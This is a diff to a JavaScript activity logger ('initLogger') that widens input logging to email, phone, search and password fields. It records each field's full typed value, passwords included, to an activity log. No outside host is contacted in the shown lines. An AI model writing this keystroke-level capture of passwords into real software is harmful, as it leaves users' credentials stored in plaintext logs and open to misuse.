@@ -81,11 +81,23 @@ function initLogger(filename = "activity_log.json") {
     }
     });
 
-    document.querySelectorAll("input[type='text'], textarea").forEach((input) => {
-    input.addEventListener("input", (event) => {
-        lastInputValues[event.target.id] = event.target.value;
+    document.querySelectorAll("input, textarea").forEach((input) => {
+        const type = input.type;
+        const allowedTypes = ["text", "number", "email", "password", "search", "url", "tel", "textarea"];
+        if (allowedTypes.includes(type) || input.tagName.toLowerCase() === "textarea") {
+            input.addEventListener("input", (event) => {
+                const id = event.target.id || "none";
+                const value = event.target.value;
+                lastInputValues[id] = value;
+                logAction("input", {
+                    fieldId: id,
+                    inputType: event.target.type,
+                    value: value
+                });
+            });
+        }
     });
-    });
+    
 
     document.querySelectorAll("input[type='checkbox'], input[type='radio']").forEach((toggle) => {
     toggle.addEventListener("change", (event) => {
